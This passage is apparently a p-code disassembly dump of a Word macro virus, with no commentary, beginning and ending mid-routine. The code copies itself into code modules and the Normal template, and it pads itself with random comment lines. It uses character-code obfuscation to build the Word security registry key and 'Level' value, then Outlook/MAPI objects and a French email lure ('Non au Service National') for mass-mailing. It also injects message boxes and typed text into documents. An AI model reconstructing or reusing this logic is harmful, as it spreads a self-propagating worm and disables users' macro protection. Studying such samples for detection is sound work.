' 	Add 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St j4 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0071 0x000A " uyenaouvt"
' Line #108:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000F " ranwqmmbxjulfh"
' Line #109:
' 	Ld h6 
' 	SelectCase 
' 	QuoteRem 0x000F 0x000E " rukocmqzlvwuw"
' Line #110:
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld j4 
' 	SelectCase 
' 	QuoteRem 0x001A 0x000F " axzdoqvsoukifq"
' Line #111:
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000A 0x0009 " rxvftkeu"
' Line #112:
' 	Ld c9 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c9 
' 	QuoteRem 0x0026 0x000D " gpjdksvvpxec"
' Line #113:
' 	LitDI2 0x000C 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0004 
' 	Add 
' 	FnInt 
' 	St e6 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d5 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld e6 
' 	For 
' 	QuoteRem 0x002B 0x000C " afoyaqetrsf"
' Line #114:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld c9 
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c9 
' 	QuoteRem 0x000E 0x0008 " dcvqgpl"
' Line #115:
' 	StartForVariable 
' 	Ld d5 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0008 0x000F " sxdkcdozybvfjt"
' Line #116:
' 	LineCont 0x0004 0A 00 00 00
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld c6 
' 	Ld c9 
' 	Ld f5 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' 	BoS 0x0000 
' 	Ld c6 
' 	LitDI2 0x0001 
' 	Add 
' 	St c6 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St c9 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0025 0x0007 " luhjxr"
' Line #117:
' 	LineCont 0x0004 02 00 00 00
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' 	BoS 0x0000 
' 	Ld b8 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ExitDo 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Loop 
' 	QuoteRem 0x003C 0x0005 " sqvf"
' Line #118:
' 	StartForVariable 
' 	Ld l2 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld k3 
' 	MemLd New 
' 	SelectCase 
' 	QuoteRem 0x001D 0x000A " fvptnouio"
' Line #119:
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld g6 
' 	Ld f5 
' 	MemSt New 
' 	QuoteRem 0x001C 0x0009 " durejfdv"
' Line #120:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld i6 
' 	MemLd New 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x0044 0x000B " vvdppxfyfp"
' Line #121:
' 	Ld g6 
' 	Ld f5 
' 	MemSt New 
' 	QuoteRem 0x000D 0x0010 " tnuvtveywbvztsl"
' Line #122:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	QuoteRem 0x0038 0x0006 " ubgwo"
' Line #123:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0033 0x000D " loqyjjatjjap"
' Line #124:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld m1 
' 	FnInStr3 
' 	SelectCase 
' 	QuoteRem 0x002E 0x0007 " zrthwf"
' Line #125:
' 	LitVarSpecial (False)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000B 0x0005 " arcd"
' Line #126:
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	QuoteRem 0x0012 0x000D " prktvdsyaktq"
' Line #127:
' 	LineCont 0x0008 0E 00 00 00 30 00 00 00
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F8E 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld h8 
' 	Ld l5 
' 	Add 
' 	Ld i1 
' 	Add 
' 	Ld i7 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	Ld g5 
' 	Ld e1 
' 	Add 
' 	Ld m4 
' 	Add 
' 	Ld b3 
' 	Add 
' 	Ld d4 
' 	Add 
' 	Ld f7 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	Ld i3 
' 	Ld g2 
' 	Add 
' 	Ld e5 
' 	Add 
' 	Ld d2 
' 	Add 
' 	Ld a4 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	Ld a3 
' 	Ld a2 
' 	Add 
' 	Ld c2 
' 	Add 
' 	Ld d1 
' 	Add 
' 	Ld c3 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	QuoteRem 0x0013 0x000F " silhjpgfuedwdo"
' Line #128:
' 	LineCont 0x0004 03 00 00 00
' 	Ld c1 
' 	Ld b2 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	Ld b1 
' 	Ld a1 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' 	QuoteRem 0x001B 0x0008 " geuoghg"
' Line #129:
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0009 " xmpzesuu"
' Line #130:
' 	Ld b9 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	QuoteRem 0x0016 0x0007 " vojcuo"
' Line #131:
' 	LitR8 0xD70A 0x70A3 0x0A3D 0x3FA7 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x0010 0x000D " cmegojyyubes"
' Line #132:
' 	Ld a7 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3FAE 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld d6 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	QuoteRem 0x003D 0x000F " igszwgfelhcaxc"
' Line #133:
' 	LitR8 0x3333 0x3333 0x3333 0x3FB3 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld c5 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	QuoteRem 0x0027 0x000D " dpfyaeyscwzc"
' Line #134:
' 	LitR8 0xD70A 0x70A3 0x0A3D 0x3FB7 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0010 " vfwoqhncpwovaxq"
' Line #135:
' 	Ld e2 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	QuoteRem 0x0016 0x000D " maeytzmtgrvo"
' Line #136:
' 	LineCont 0x0004 06 00 00 00
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	QuoteRem 0x003F 0x000F " bdvxgyomlxjhpx"
' Line #137:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0006 " rfupa"
' Line #138:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x0014 0x000B " dgdsqhpsmc"
' Line #139:
' 	LineCont 0x0004 23 00 00 00
' 	FuncDefn (Private Sub f1())
' 	BoS 0x0000 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h7 
' 	BoS 0x0000 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g8 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St j1 
' 	QuoteRem 0x007B 0x0006 " qxklu"
' Line #140:
' 	LineCont 0x0008 25 00 00 00 2E 00 00 00
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	QuoteRem 0x00F6 0x0005 " euvz"
' Line #141:
' 	LineCont 0x0008 21 00 00 00 4E 00 00 00
' 	Ld k2 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	QuoteRem 0x003C 0x0010 " owybhthosiibhie"
' Line #142:
' 	Ld k2 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	QuoteRem 0x0073 0x0006 " cvsvs"
' Line #143:
' 	LineCont 0x0008 16 00 00 00 2C 00 00 00
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j8 
' 	BoS 0x0000 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l1 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St m5 
' 	QuoteRem 0x001C 0x000E " drrzlpnracimw"
' Line #144:
' 	LineCont 0x000C 07 00 00 00 52 00 00 00 61 00 00 00
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l8 
' 	BoS 0x0000 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a5 
' 	BoS 0x0000 
' 	Ld a5 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a5 
' 	QuoteRem 0x0036 0x000F " hignccwjyqbqzg"
' Line #145:
' 	LineCont 0x0004 0C 00 00 00
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	QuoteRem 0x0058 0x0008 " coghqjb"
' Line #146:
' 	Ld d3 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	Ld d3 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	Ld d3 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	Ld d3 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	QuoteRem 0x017E 0x000D " aofaegotxort"
' Line #147:
' 	LineCont 0x0004 0B 00 00 00
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g6 
' 	QuoteRem 0x0014 0x0009 " eqbkutau"
' Line #148:
' 	LineCont 0x0004 0A 00 00 00
' 	LitStr 0x0003 "Non"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "National"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Oui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h3 
' 	QuoteRem 0x0059 0x0009 " ifpmdwmf"
' Line #149:
' 	LineCont 0x0004 26 00 00 00
' 	Ld h3 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Travail"
' 	Add 
' 	St h3 
' 	BoS 0x0000 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k1 
' 	BoS 0x0000 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k5 
' 	BoS 0x0000 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g3 
' 	QuoteRem 0x00E3 0x000A " aeffticvz"
' Line #150:
' 	LineCont 0x0004 02 00 00 00
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n6 
' 	QuoteRem 0x001E 0x0007 " gjfcod"
' Line #151:
' 	LitStr 0x000D "Suggestion..."
' 	St h5 
' 	QuoteRem 0x0015 0x000E " poqasbvnatfhh"
' Line #152:
' 	LitStr 0x0002 "Ce"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "document"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "vaut"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	St j5 
' 	QuoteRem 0x0073 0x0008 " prnpmqb"
' Line #153:
' 	Ld j5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "petit"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "coup"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "oeil."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "J"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "aimerais"
' 	Add 
' 	St j5 
' 	BoS 0x0000 
' 	Ld j5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "savoir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "correspond"
' 	Add 
